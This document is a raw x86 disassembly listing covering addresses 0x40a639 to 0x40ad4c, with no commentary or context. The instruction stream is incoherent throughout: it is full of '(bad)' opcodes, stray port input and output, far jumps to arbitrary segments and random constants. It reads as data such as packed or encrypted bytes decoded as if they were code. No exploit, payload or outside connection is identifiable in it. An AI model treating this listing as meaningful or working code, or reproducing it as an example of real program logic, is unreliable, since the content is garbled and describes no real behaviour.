  40a639:	xchg   ebx,eax
  40a63a:	mov    al,0xee
  40a63c:	jecxz  0x40a649
  40a63e:	jle    0x40a5c7
  40a640:	test   bl,bh
  40a642:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a643:	pop    ebp
  40a644:	loope  0x40a66c
  40a646:	gs adc al,0xa2
  40a649:	and    esp,DWORD PTR [eax+0x6b8dd796]
  40a64f:	in     al,0xde
  40a651:	scas   eax,DWORD PTR es:[edi]
  40a652:	and    BYTE PTR [esi+0x7e],bl
  40a655:	out    dx,al
  40a656:	xchg   ecx,eax
  40a657:	adc    dl,ah
  40a659:	fs cld 
  40a65b:	mov    ch,dh
  40a65d:	jmp    0x40a5df
  40a65f:	ret    
  40a660:	xchg   edi,eax
  40a661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a662:	mov    WORD PTR [ebx-0x2c],fs
  40a665:	lock mov al,ds:0x71eb3389
  40a66b:	fst    QWORD PTR [edi+0x5c]
  40a66e:	sub    bh,BYTE PTR [esi-0x51]
  40a671:	sbb    eax,0x68d05ae5
  40a676:	add    ecx,ecx
  40a678:	jge    0x40a6cb
  40a67a:	xchg   bh,dl
  40a67c:	pop    esi
  40a67d:	inc    ebp
  40a67e:	stc    
  40a67f:	pusha  
  40a680:	sbb    BYTE PTR [esi-0x29],dl
  40a683:	daa    
  40a684:	pop    DWORD PTR [edi]
  40a686:	sar    BYTE PTR [ebp-0x121f696a],cl
  40a68c:	sbb    DWORD PTR [eax+0x6],ebp
  40a68f:	push   edi
  40a690:	mov    cl,0x95
  40a692:	xchg   edi,eax
  40a693:	mov    ebx,gs
  40a695:	or     esi,DWORD PTR [esi+ecx*2]
  40a698:	mov    al,0x4a
  40a69a:	jae    0x40a6e9
  40a69c:	dec    ebp
  40a69d:	dec    esp
  40a69e:	and    eax,0x24fdfe4e
  40a6a3:	pop    esp
  40a6a4:	cld    
  40a6a5:	or     ecx,DWORD PTR [esi-0x75fc961b]
  40a6ab:	push   ebp
  40a6ac:	and    esp,esp
  40a6ae:	inc    edx
  40a6af:	push   ss
  40a6b0:	mov    dl,BYTE PTR [ecx+0x44]
  40a6b3:	adc    edi,DWORD PTR [edi]
  40a6b5:	jecxz  0x40a6a2
  40a6b7:	std    
  40a6b8:	enter  0x4d83,0x71
  40a6bc:	mov    DWORD PTR [eax-0x6aaae1fa],ebp
  40a6c2:	cmp    cl,BYTE PTR [ecx-0x170b6484]
  40a6c8:	stc    
  40a6c9:	xor    al,0x2f
  40a6cb:	in     eax,dx
  40a6cc:	rcl    dl,1
  40a6ce:	and    eax,0x23653d1c
  40a6d3:	mov    ds:0xb32f2e1c,eax
  40a6d8:	lock out 0x42,al
  40a6db:	mov    ds:0xd80a6383,al
  40a6e0:	mov    ?,WORD PTR [ebx+0x4]
  40a6e3:	pusha  
  40a6e4:	mov    dl,0x4
  40a6e6:	ja     0x40a6f2
  40a6e8:	jb     0x40a66b
  40a6ea:	pop    ecx
  40a6eb:	fwait
  40a6ec:	mov    esi,DWORD PTR [edi]
  40a6ee:	sub    eax,DWORD PTR ds:0x975768b3
  40a6f4:	mov    ch,0xd7
  40a6f6:	je     0x40a773
  40a6f8:	fild   DWORD PTR [ebx+ecx*4]
  40a6fb:	pop    ds
  40a6fc:	mov    ah,BYTE PTR [ecx+eax*4]
  40a6ff:	jbe    0x40a6d1
  40a701:	jb     0x40a6b2
  40a703:	adc    al,0xf8
  40a705:	xchg   edi,eax
  40a706:	test   eax,0xbc702c73
  40a70b:	sub    esp,edi
  40a70d:	sahf   
  40a70e:	fmul   QWORD PTR [edi]
  40a710:	cmp    esi,DWORD PTR [ebx+0x60e695a7]
  40a716:	dec    ebx
  40a717:	jno    0x40a75c
  40a719:	fmul   DWORD PTR [ecx]
  40a71b:	pop    esi
  40a71c:	mov    al,0x98
  40a71e:	out    0x82,al
  40a720:	out    dx,al
  40a721:	mov    esi,0x707289f4
  40a726:	nop
  40a727:	pop    edx
  40a728:	push   esi
  40a729:	pop    ebx
  40a72a:	stc    
  40a72b:	es dec ebp
  40a72d:	adc    bl,bh
  40a72f:	out    dx,eax
  40a730:	sbb    eax,0x55781078
  40a735:	test   eax,0x5f8cb4f3
  40a73a:	scas   eax,DWORD PTR es:[edi]
  40a73b:	mov    al,0xfe
  40a73e:	jg     0x40a7b9
  40a740:	in     eax,dx
  40a741:	in     al,0x9f
  40a743:	and    eax,DWORD PTR [ebp-0x178d633e]
  40a749:	enter  0x6083,0xe0
  40a74d:	popf   
  40a74e:	dec    ebx
  40a74f:	mov    ecx,edx
  40a751:	cmc    
  40a752:	xor    BYTE PTR [edx+0x32],dh
  40a755:	stc    
  40a756:	(bad)  [esi+0x4f]
  40a759:	push   es
  40a75a:	call   DWORD PTR [edx-0x39a1f2bf]
  40a760:	(bad)  
  40a761:	cmp    edx,edx
  40a763:	xchg   DWORD PTR [ecx+edx*4+0x68c40695],ebx
  40a76a:	clc    
  40a76b:	xor    dh,BYTE PTR [esi]
  40a76d:	dec    ebp
  40a76e:	bound  ebx,QWORD PTR [edx]
  40a770:	(bad)  
  40a771:	jmp    0xe67e:0xc418c5d5
  40a778:	(bad)  
  40a77a:	stc    
  40a77b:	add    edi,DWORD PTR [ebp-0x29]
  40a77e:	repnz pop edi
  40a780:	bound  edx,QWORD PTR [ecx-0x80]
  40a783:	jns    0x40a775
  40a785:	rcl    DWORD PTR [ebp+ebx*4+0x65],cl
  40a789:	iret   
  40a78a:	dec    eax
  40a78b:	mov    bh,0x88
  40a78d:	icebp  
  40a78e:	pop    ecx
  40a78f:	leave  
  40a790:	dec    ebp
  40a791:	(bad)  
  40a792:	retf   
  40a793:	fs clc 
  40a795:	test   DWORD PTR [esp+ebx*8-0x6912f332],0xd6cb294c
  40a7a0:	mov    cl,0x5
  40a7a2:	mov    ebp,0x7f5c4033
  40a7a7:	push   ecx
  40a7a8:	xchg   esp,eax
  40a7a9:	mov    cl,0xea
  40a7ab:	shl    ah,1
  40a7ad:	fdivr  DWORD PTR [esi+0x7d000f54]
  40a7b3:	push   edx
  40a7b4:	retf   
  40a7b5:	ror    bh,1
  40a7b7:	xchg   ecx,eax
  40a7b8:	arpl   WORD PTR [esp+ecx*8],di
  40a7bb:	pop    es
  40a7bc:	lods   al,BYTE PTR ds:[esi]
  40a7bd:	ret    0x9d0c
  40a7c0:	(bad)  
  40a7c1:	out    0xda,eax
  40a7c3:	rol    BYTE PTR [ecx],0x9e
  40a7c6:	cmp    DWORD PTR [ecx+0x31],esp
  40a7c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7ca:	lock push esp
  40a7cc:	mov    dh,0xb5
  40a7ce:	outs   dx,BYTE PTR ds:[esi]
  40a7cf:	int    0xf3
  40a7d1:	or     DWORD PTR [eax],edi
  40a7d3:	call   0x134b:0x268d6603
  40a7da:	(bad)  
  40a7db:	cld    
  40a7dc:	pop    ss
  40a7dd:	es cmc 
  40a7df:	push   es
  40a7e0:	out    dx,eax
  40a7e1:	push   esp
  40a7e2:	pop    es
  40a7e3:	retf   
  40a7e4:	div    DWORD PTR [edi+0x748d36cd]
  40a7ea:	mov    cl,0xc5
  40a7ec:	and    al,0x9c
  40a7ef:	add    DWORD PTR [eax-0x47de0db4],ecx
  40a7f5:	jnp    0x40a7ff
  40a7f7:	icebp  
  40a7f8:	and    BYTE PTR [ecx+0x4f],0x1e
  40a7fc:	repz sbb eax,0xf4ec347e
  40a802:	dec    eax
  40a803:	jmp    0xfdac91e5
  40a808:	inc    ecx
  40a809:	cmp    DWORD PTR [edx+0x1d],esp
  40a80c:	add    BYTE PTR [edx-0x65],0x52
  40a810:	add    BYTE PTR [ebx],dl
  40a812:	in     eax,dx
  40a813:	adc    BYTE PTR [edi],dh
  40a815:	mov    eax,0xe9dea6b6
  40a81a:	into   
  40a81b:	ffree  st(3)
  40a81d:	sbb    al,BYTE PTR ds:0x5f83e29d
  40a823:	and    ah,0x2a
  40a826:	xor    dh,BYTE PTR [eax-0x37]
  40a829:	inc    eax
  40a82a:	push   0xffffffe6
  40a82c:	std    
  40a82d:	xor    esp,DWORD PTR [ebx+0x3e8cd2be]
  40a833:	xchg   ebp,eax
  40a834:	(bad)  
  40a836:	adc    eax,0xcc6e2b3e
  40a83b:	inc    ebx
  40a83c:	dec    esi
  40a83d:	pop    es
  40a83e:	xchg   edx,eax
  40a83f:	xchg   esi,eax
  40a840:	jmp    0xa89f:0x31b2352d
  40a847:	pop    ds
  40a848:	or     al,0xc6
  40a84a:	loop   0x40a86a
  40a84c:	add    eax,0x55955411
  40a851:	inc    edx
  40a852:	js     0x40a89e
  40a854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a855:	xlat   BYTE PTR ds:[ebx]
  40a856:	pusha  
  40a857:	mov    dh,0x82
  40a859:	std    
  40a85a:	(bad)  
  40a85b:	xor    BYTE PTR [edx-0x354f19c0],bh
  40a861:	repz cmp eax,0x96440b30
  40a867:	sub    dl,ah
  40a869:	popf   
  40a86a:	int3   
  40a86b:	fmulp  st(0),st
  40a86d:	inc    edi
  40a86e:	dec    ebx
  40a86f:	sbb    ebx,ebp
  40a871:	pop    edx
  40a872:	fnstcw WORD PTR [eax-0x51]
  40a875:	pop    edx
  40a876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a877:	es or  eax,0x5a509821
  40a87d:	jmp    0x857ab29f
  40a882:	aaa    
  40a883:	jle    0x40a83b
  40a885:	leave  
  40a886:	or     ebx,eax
  40a888:	jnp    0x40a8d8
  40a88a:	leave  
  40a88b:	dec    eax
  40a88c:	mov    gs,WORD PTR [ebp-0x14f692dc]
  40a892:	cmp    BYTE PTR [esi+0x45],ch
  40a895:	(bad)  
  40a896:	xor    DWORD PTR [edi],eax
  40a898:	push   eax
  40a899:	or     eax,0x66d5b3b4
  40a89e:	fisubr WORD PTR [eax-0x1e]
  40a8a1:	std    
  40a8a2:	ins    BYTE PTR es:[edi],dx
  40a8a3:	aam    0x2f
  40a8a5:	(bad)  
  40a8a6:	and    DWORD PTR [esi],ecx
  40a8a8:	das    
  40a8a9:	inc    esp
  40a8aa:	cmp    eax,0xe638c68d
  40a8af:	inc    eax
  40a8b0:	inc    edx
  40a8b1:	je     0x40a841
  40a8b3:	sbb    DWORD PTR [eax-0xf],0xef9fc0e5
  40a8ba:	xchg   edx,eax
  40a8bb:	clc    
  40a8bc:	repz mov ebx,0x13d5b4a0
  40a8c2:	pop    edx
  40a8c3:	stc    
  40a8c4:	lods   al,BYTE PTR ds:[esi]
  40a8c5:	sbb    al,0xf6
  40a8c7:	int3   
  40a8c8:	test   DWORD PTR [edx-0x1f],ecx
  40a8cb:	mov    ch,0xce
  40a8cd:	pop    eax
  40a8ce:	cmc    
  40a8cf:	dec    ecx
  40a8d0:	rcl    DWORD PTR [ebx+0x50],1
  40a8d3:	adc    ecx,DWORD PTR [esi-0x7a]
  40a8d6:	aam    0xe
  40a8d8:	adc    ah,BYTE PTR [ecx]
  40a8da:	jno    0x40a8e8
  40a8dc:	sbb    edi,ecx
  40a8de:	jg     0x40a8fa
  40a8e0:	out    0x6c,al
  40a8e2:	lods   eax,DWORD PTR ds:[esi]
  40a8e3:	dec    edx
  40a8e4:	jg     0x40a8bb
  40a8e6:	xchg   edx,eax
  40a8e7:	or     bh,cl
  40a8e9:	push   DWORD PTR [esi+ebx*1]
  40a8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8ed:	iret   
  40a8ee:	scas   al,BYTE PTR es:[edi]
  40a8ef:	icebp  
  40a8f0:	scas   eax,DWORD PTR es:[di]
  40a8f2:	push   esi
  40a8f3:	xor    al,0xfa
  40a8f5:	mov    esi,0x8cfb8e4b
  40a8fa:	dec    ecx
  40a8fb:	js     0x40a924
  40a8fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8fe:	inc    ecx
  40a8ff:	add    bl,al
  40a901:	jmp    0xf29d6bf4
  40a906:	inc    eax
  40a907:	xor    dh,dl
  40a909:	sbb    eax,DWORD PTR [ecx+0x3a]
  40a90c:	addr16 push edx
  40a90e:	dec    esi
  40a90f:	push   0x35
  40a911:	pusha  
  40a912:	repz fld TBYTE PTR [edi-0x26]
  40a916:	push   ecx
  40a917:	sub    esi,DWORD PTR [ecx+edx*1-0x11]
  40a91b:	fcmovne st,st(5)
  40a91d:	jmp    0x40a92f
  40a91f:	outs   dx,DWORD PTR ds:[esi]
  40a920:	cdq    
  40a921:	test   eax,0x260313c8
  40a926:	fisttp QWORD PTR [esi+eax*1+0x51]
  40a92a:	inc    edx
  40a92b:	sbb    al,0x2b
  40a92d:	mov    cl,bl
  40a92f:	pop    ds
  40a930:	xor    DWORD PTR [ebp+ebx*8+0x48],edi
  40a934:	dec    esi
  40a935:	jecxz  0x40a93b
  40a937:	mov    gs,WORD PTR [ecx+0x59]
  40a93a:	test   DWORD PTR [eax+0x2ff70362],esp
  40a940:	inc    edx
  40a941:	inc    esp
  40a942:	aaa    
  40a943:	jne    0x40a90e
  40a945:	sub    eax,0x30d3cb5c
  40a94a:	mov    dh,0x7
  40a94c:	mov    bh,0xc6
  40a94e:	sub    esi,ecx
  40a950:	loopne 0x40a96e
  40a952:	or     al,0x7a
  40a954:	cld    
  40a955:	leave  
  40a956:	int    0x8b
  40a958:	dec    ecx
  40a959:	mov    al,ds:0x89b42c53
  40a95e:	shr    DWORD PTR [edi+ebp*1-0x3986a0d],cl
  40a965:	sub    ebx,DWORD PTR [esi]
  40a967:	add    BYTE PTR [eax],dh
  40a969:	and    DWORD PTR [ecx-0x1],ecx
  40a96c:	imul   eax,DWORD PTR [eax+edi*8]
  40a970:	dec    esi
  40a971:	popf   
  40a972:	cmp    bl,BYTE PTR [eax]
  40a974:	bound  ebx,QWORD PTR [ebp-0x46cac190]
  40a97a:	mov    edi,0x5fbc5970
  40a97f:	mov    ds:0xc38a2a5c,eax
  40a984:	jns    0x40a920
  40a986:	(bad)  
  40a987:	out    0x8c,eax
  40a989:	mov    ch,0xc4
  40a98b:	inc    ebx
  40a98c:	push   eax
  40a98d:	cmp    al,0x48
  40a98f:	ror    BYTE PTR [ecx-0x6d657e91],cl
  40a995:	sbb    al,0x3d
  40a997:	imul   edi,ebx,0xfeae0c95
  40a99d:	jl     0x40a93b
  40a99f:	pop    edi
  40a9a0:	sbb    al,0x32
  40a9a2:	push   ss
  40a9a3:	xchg   BYTE PTR [ebp-0x5e],cl
  40a9a6:	bound  eax,QWORD PTR [edx+ecx*8]
  40a9a9:	xchg   edx,eax
  40a9aa:	mov    ch,0x5a
  40a9ac:	test   DWORD PTR [esi+edx*8-0x740cbd07],0xba9c084f
  40a9b7:	or     al,0x93
  40a9b9:	jl     0x40a93e
  40a9bb:	je     0x40a9ff
  40a9bd:	dec    edx
  40a9be:	mov    edi,0x5c147c3e
  40a9c3:	pop    edx
  40a9c4:	sti    
  40a9c5:	mov    ch,0x7f
  40a9c7:	jecxz  0x40aa11
  40a9c9:	outs   dx,DWORD PTR ds:[esi]
  40a9ca:	icebp  
  40a9cb:	cmp    al,0xee
  40a9cd:	or     bl,BYTE PTR [ebp+0x6ab96ce3]
  40a9d3:	nop
  40a9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d5:	int    0x8d
  40a9d7:	add    BYTE PTR ds:0x3e765bd9,dh
  40a9dd:	cmp    DWORD PTR [ecx+0x3b],esp
  40a9e0:	sub    ebx,DWORD PTR [edx+0x5c]
  40a9e3:	aaa    
  40a9e4:	cwde   
  40a9e5:	icebp  
  40a9e6:	push   ebx
  40a9e7:	outs   dx,DWORD PTR ds:[esi]
  40a9e8:	push   ds
  40a9e9:	xor    edx,eax
  40a9eb:	fldcw  WORD PTR [edx-0x499ba359]
  40a9f1:	jmp    0xf28424e5
  40a9f6:	dec    DWORD PTR [edx-0x46]
  40a9f9:	stos   DWORD PTR es:[edi],eax
  40a9fa:	int3   
  40a9fb:	sub    eax,0xd24615a4
  40aa00:	lods   eax,DWORD PTR ds:[esi]
  40aa01:	jb     0x40aa65
  40aa03:	xor    al,al
  40aa05:	js     0x40a9ed
  40aa07:	lods   eax,DWORD PTR ds:[esi]
  40aa08:	ret    
  40aa09:	addr16 dec esp
  40aa0b:	jp     0x40aa0e
  40aa0d:	and    edx,DWORD PTR [esi-0x7910f82b]
  40aa13:	cmp    eax,0x5413b903
  40aa18:	loop   0x40aa68
  40aa1a:	test   DWORD PTR [esi],eax
  40aa1c:	int3   
  40aa1d:	xchg   edx,eax
  40aa1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa1f:	sub    eax,0xdecc9305
  40aa24:	(bad)  
  40aa26:	sti    
  40aa27:	pop    es
  40aa28:	push   ebx
  40aa29:	shr    BYTE PTR [eax+0x535a81b5],1
  40aa2f:	mov    edx,ebp
  40aa31:	fiadd  DWORD PTR [ebx+0x5d46e5c6]
  40aa37:	(bad)  
  40aa38:	call   0x4f5f:0xd6087a6c
  40aa3f:	adc    eax,DWORD PTR [edx+0x24]
  40aa42:	je     0x40aabf
  40aa44:	and    DWORD PTR [ecx+eiz*4-0x43266548],esi
  40aa4b:	les    esp,FWORD PTR [edi]
  40aa4d:	jecxz  0x40a9f8
  40aa4f:	(bad)  
  40aa50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa51:	loop   0x40aa04
  40aa53:	sub    edi,esi
  40aa55:	test   DWORD PTR [ebx+edx*4+0x2a06ca61],0x626f206f
  40aa60:	push   ebp
  40aa61:	call   0x1af8af77
  40aa66:	mul    BYTE PTR [edi+0x72218ecc]
  40aa6c:	adc    al,bl
  40aa6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa6f:	enter  0x69a2,0x26
  40aa73:	les    edi,FWORD PTR [ebx-0x4a598f68]
  40aa79:	add    BYTE PTR [ebp+ecx*1-0x5481e633],0x6e
  40aa81:	sub    DWORD PTR [ecx+0x62cc5a84],eax
  40aa87:	int    0xd1
  40aa89:	inc    edi
  40aa8a:	cmp    eax,0x1b34bc44
  40aa8f:	pusha  
  40aa90:	adc    BYTE PTR [ecx-0x51],bh
  40aa93:	enter  0x8655,0x7f
  40aa97:	es push cs
  40aa99:	test   BYTE PTR [eax+edx*2-0x5a],al
  40aa9d:	mov    edi,DWORD PTR [edx-0x798c79d0]
  40aaa3:	test   eax,0x88ba5920
  40aaa8:	or     BYTE PTR ds:0xb43b4ba8,ah
  40aaae:	pop    ebx
  40aaaf:	mov    ah,ch
  40aab1:	in     eax,dx
  40aab2:	mov    dl,0x4c
  40aab4:	sti    
  40aab5:	inc    ecx
  40aab6:	ror    DWORD PTR [ebx+0x5af85637],0x32
  40aabd:	mov    bh,0xab
  40aabf:	ins    BYTE PTR es:[edi],dx
  40aac0:	sub    esi,eax
  40aac2:	sbb    DWORD PTR [ebx+0x36c9fdbe],edi
  40aac8:	stc    
  40aac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaca:	xchg   edx,eax
  40aacb:	js     0x40ab07
  40aacd:	jmp    0x40ab19
  40aacf:	out    0x8d,al
  40aad1:	push   ecx
  40aad2:	lock add ecx,DWORD PTR [ecx+0x62]
  40aad6:	sbb    dh,BYTE PTR [ecx-0x15]
  40aad9:	mov    ebp,0x41dacffe
  40aade:	cmp    DWORD PTR [eax-0x1a],esp
  40aae1:	mov    eax,0x36aa0155
  40aae6:	xlat   BYTE PTR ds:[ebx]
  40aae7:	sub    al,0x29
  40aae9:	int3   
  40aaea:	imul   eax,DWORD PTR [eax],0x5994b513
  40aaf0:	lods   al,BYTE PTR ds:[esi]
  40aaf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaf3:	enter  0x41,0x3f
  40aaf7:	icebp  
  40aaf8:	out    0x13,al
  40aafa:	ret    
  40aafb:	stos   DWORD PTR es:[edi],eax
  40aafc:	jne    0x40aaa4
  40aafe:	leave  
  40aaff:	ins    BYTE PTR es:[edi],dx
  40ab00:	and    al,0x1
  40ab02:	jecxz  0x40aaa8
  40ab04:	bnd jmp 0x7b1000ac
  40ab0a:	lods   al,BYTE PTR ds:[esi]
  40ab0b:	fsub   st,st(7)
  40ab0d:	dec    ebx
  40ab0e:	in     al,0x21
  40ab10:	add    ecx,ebp
  40ab12:	js     0x40ab6c
  40ab14:	and    eax,0x2763c005
  40ab19:	mov    al,ds:0xa334e5b4
  40ab1e:	add    ch,ah
  40ab20:	inc    ecx
  40ab21:	xor    BYTE PTR [eax],bh
  40ab23:	mov    ebx,0x7832ecc
  40ab28:	dec    ecx
  40ab29:	cmp    DWORD PTR [esi+0x1f],edi
  40ab2c:	cmc    
  40ab2d:	test   eax,0x5bdba589
  40ab32:	outs   dx,DWORD PTR ds:[esi]
  40ab33:	dec    esi
  40ab34:	(bad)  
  40ab35:	in     al,dx
  40ab36:	jo     0x40aace
  40ab38:	fisttp QWORD PTR [ecx-0x20]
  40ab3b:	aas    
  40ab3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab3d:	push   ecx
  40ab3e:	add    DWORD PTR [ebp+0x7f],ecx
  40ab41:	fcmovne st,st(0)
  40ab43:	jmp    DWORD PTR [edi]
  40ab45:	jmp    0xaa0b:0x8d68e946
  40ab4c:	xchg   ebx,eax
  40ab4d:	call   0xdfa6:0x13e082de
  40ab54:	inc    ebx
  40ab55:	mov    cl,0xa6
  40ab57:	rcl    DWORD PTR [edx],cl
  40ab59:	jecxz  0x40ab05
  40ab5b:	sub    eax,DWORD PTR [esi-0x37]
  40ab5e:	stos   BYTE PTR es:[edi],al
  40ab5f:	sub    al,0xcd
  40ab61:	jnp    0x40abcb
  40ab63:	jg     0x40ab9b
  40ab65:	js     0x40ab12
  40ab67:	hlt    
  40ab68:	inc    ebp
  40ab69:	sbb    ch,dh
  40ab6b:	gs mov eax,0xbd82a670
  40ab71:	pop    esp
  40ab72:	mov    dl,0x5a
  40ab74:	push   ss
  40ab75:	xor    ah,ah
  40ab77:	ret    0x657
  40ab7a:	and    DWORD PTR [edi],ebx
  40ab7c:	(bad)  
  40ab7d:	sbb    dl,BYTE PTR [ecx]
  40ab7f:	push   edx
  40ab80:	call   0xb890e5b4
  40ab85:	inc    esi
  40ab86:	cmp    BYTE PTR [eax],bh
  40ab88:	pushf  
  40ab89:	pop    es
  40ab8a:	push   cs
  40ab8b:	xor    al,0xac
  40ab8d:	push   edi
  40ab8e:	jnp    0x40abe8
  40ab90:	xchg   edi,eax
  40ab91:	arpl   WORD PTR [ebp+0x537f1a71],cx
  40ab97:	scas   al,BYTE PTR es:[edi]
  40ab98:	inc    esp
  40ab99:	or     esp,0xaee70dfc
  40ab9f:	dec    esp
  40aba0:	arpl   WORD PTR [ebp-0x47],cx
  40aba3:	mov    BYTE PTR [edi],dl
  40aba5:	dec    ecx
  40aba6:	sub    DWORD PTR [ecx],ebp
  40aba8:	jmp    0x7624:0x1d718937
  40abaf:	xchg   esi,eax
  40abb0:	xor    DWORD PTR [edx],ebx
  40abb2:	push   esi
  40abb3:	or     esi,DWORD PTR [ebx+0x34f2d705]
  40abb9:	mov    dh,0x5f
  40abbb:	or     BYTE PTR [ebx+ecx*2],ah
  40abbe:	cmp    BYTE PTR [esi],dh
  40abc0:	xchg   esp,eax
  40abc1:	cmp    al,0xcb
  40abc3:	fbstp  TBYTE PTR [esp+esi*1-0x3847534a]
  40abca:	scas   eax,DWORD PTR es:[edi]
  40abcb:	push   ds
  40abcc:	aad    0x1e
  40abce:	inc    ebx
  40abcf:	mov    ch,0x7c
  40abd1:	inc    ebx
  40abd2:	and    bh,al
  40abd4:	xor    dl,BYTE PTR [ecx]
  40abd6:	repnz mov fs,WORD PTR [edx+0x6f3f02b7]
  40abdd:	add    DWORD PTR [ebp+0x5280929],ebp
  40abe3:	(bad)  
  40abe5:	and    eax,0x39ea7ae1
  40abea:	cmp    ebx,edi
  40abec:	js     0x40ab6f
  40abee:	lock xchg DWORD PTR [edx],esp
  40abf1:	and    ebx,ebp
  40abf3:	pop    esp
  40abf4:	inc    edi
  40abf5:	dec    ebx
  40abf6:	mov    al,ds:0xfd3a18b1
  40abfb:	mov    esi,0x8c6f5d16
  40ac00:	sub    bh,cl
  40ac02:	or     al,BYTE PTR [edi]
  40ac04:	mov    ds:0xb9b45cfc,eax
  40ac09:	xchg   ebx,eax
  40ac0a:	xchg   esi,eax
  40ac0b:	idiv   DWORD PTR [edi]
  40ac0d:	xor    eax,0xa87d6e63
  40ac12:	sbb    al,0xc3
  40ac14:	mov    esp,0xa0d93cde
  40ac19:	mov    ecx,0x6bf5dd14
  40ac1e:	out    0xa4,al
  40ac20:	mov    esi,0x2e149d33
  40ac25:	pop    ecx
  40ac26:	pop    edi
  40ac27:	neg    ebp
  40ac29:	sbb    BYTE PTR [ebx-0x7dcf7b6b],ch
  40ac2f:	mov    BYTE PTR [edi-0x11],dl
  40ac32:	(bad)  
  40ac33:	cli    
  40ac34:	mov    al,ds:0x3589c604
  40ac39:	repz sub ebx,DWORD PTR [ecx]
  40ac3c:	leave  
  40ac3d:	dec    ecx
  40ac3e:	jnp    0x40abcd
  40ac40:	or     al,0x66
  40ac42:	fisub  DWORD PTR [eax+0x511b0cb9]
  40ac48:	mov    dh,0x50
  40ac4a:	ret    
  40ac4b:	das    
  40ac4c:	and    eax,0x6816376c
  40ac51:	and    al,0xb1
  40ac53:	mov    bl,0xe7
  40ac55:	test   al,0x9c
  40ac57:	cmp    BYTE PTR [esi+0x1b],cl
  40ac5a:	push   cs
  40ac5b:	mov    ds:0x81814ee1,al
  40ac60:	sbb    ch,BYTE PTR [edx+eiz*8-0x52]
  40ac64:	jmp    0x40ac9d
  40ac66:	imul   edi,DWORD PTR [edi+0x62],0xffffffc7
  40ac6a:	xor    al,0x9e
  40ac6c:	jl     0x40ace7
  40ac6e:	mov    ecx,0xa52f4e6f
  40ac73:	dec    esp
  40ac74:	inc    esi
  40ac75:	icebp  
  40ac76:	test   ebx,eax
  40ac78:	sti    
  40ac79:	(bad)  
  40ac7a:	fnstsw WORD PTR [esp+edx*2+0x2]
  40ac7e:	pop    es
  40ac7f:	ror    dh,cl
  40ac81:	sahf   
  40ac82:	ins    DWORD PTR es:[edi],dx
  40ac83:	mov    ah,0x24
  40ac85:	retf   
  40ac86:	xchg   ebp,eax
  40ac87:	pushf  
  40ac88:	cmp    edx,DWORD PTR [esp+eax*8-0x4593a926]
  40ac8f:	jb     0x40accb
  40ac91:	sbb    ebx,DWORD PTR [edx]
  40ac93:	into   
  40ac94:	inc    ebp
  40ac95:	ja     0x40ac96
  40ac97:	xor    al,0x6f
  40ac99:	xor    eax,0x95faafcf
  40ac9e:	cli    
  40ac9f:	js     0x40ad0c
  40aca1:	std    
  40aca2:	ins    BYTE PTR es:[edi],dx
  40aca3:	fsub   DWORD PTR [edi+0x151460c0]
  40aca9:	in     eax,0x99
  40acab:	adc    BYTE PTR [esi+0x6d0d959d],ah
  40acb1:	mov    eax,ds:0x3c648eca
  40acb6:	(bad)  
  40acb7:	aaa    
  40acb8:	and    al,0xa
  40acba:	sub    BYTE PTR [ecx],dl
  40acbc:	into   
  40acbd:	in     eax,0xc9
  40acbf:	mov    bl,0x95
  40acc1:	pop    ebp
  40acc2:	inc    ebx
  40acc3:	pop    ebx
  40acc4:	push   esi
  40acc5:	mov    es,WORD PTR [esi]
  40acc7:	pop    ebp
  40acc8:	or     esp,DWORD PTR [ecx]
  40acca:	mov    WORD PTR [ebp+0x71d85354],gs
  40acd0:	adc    DWORD PTR [eax+0x1b],edi
  40acd3:	clc    
  40acd4:	push   es
  40acd5:	add    BYTE PTR [ecx-0x73],0x1b
  40acd9:	mov    al,0xa2
  40acdb:	aam    0xd
  40acdd:	lods   al,BYTE PTR ds:[esi]
  40acde:	pushf  
  40acdf:	out    dx,eax
  40ace0:	xor    eax,0x6850735b
  40ace5:	cmp    al,0xe8
  40ace7:	je     0x40acfc
  40ace9:	(bad)  
  40acea:	xchg   ecx,eax
  40aceb:	pushf  
  40acec:	std    
  40aced:	mov    al,ds:0x806062d4
  40acf2:	xchg   esi,eax
  40acf3:	inc    ecx
  40acf4:	jmp    0x40acd4
  40acf6:	mov    edi,0x289e0583
  40acfb:	sub    al,0x50
  40acfd:	inc    esi
  40acfe:	pop    eax
  40acff:	sub    DWORD PTR [edx-0x55d3e490],ebx
  40ad05:	jo     0x40ad71
  40ad07:	mov    al,0x0
  40ad09:	push   ebp
  40ad0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad0b:	adc    DWORD PTR [ecx-0x5bd016da],eax
  40ad11:	and    eax,DWORD PTR [esi]
  40ad13:	xor    DWORD PTR [edi+edi*1-0x2f],edx
  40ad17:	les    ecx,FWORD PTR [ecx-0x718da63d]
  40ad1d:	fisttp WORD PTR [esi-0x24d2d346]
  40ad23:	sbb    al,0x40
  40ad25:	cmp    BYTE PTR [ebx+esi*8],dl
  40ad28:	ins    DWORD PTR es:[edi],dx
  40ad29:	inc    edx
  40ad2a:	retf   
  40ad2b:	pop    ss
  40ad2c:	scas   eax,DWORD PTR es:[edi]
  40ad2d:	xchg   edi,eax
  40ad2e:	xor    BYTE PTR [edi],bl
  40ad30:	imul   esp,DWORD PTR [ebp-0x18b95cf3],0xffffffeb
  40ad37:	rcl    BYTE PTR [edx],cl
  40ad39:	add    DWORD PTR ds:0xfe68e8d2,esi
  40ad3f:	not    DWORD PTR [edi-0x65d509ea]
  40ad45:	or     dh,BYTE PTR [eax+esi*2+0x6d]
  40ad49:	ss add al,0xb3
  40ad4c:	sub    al,0x61
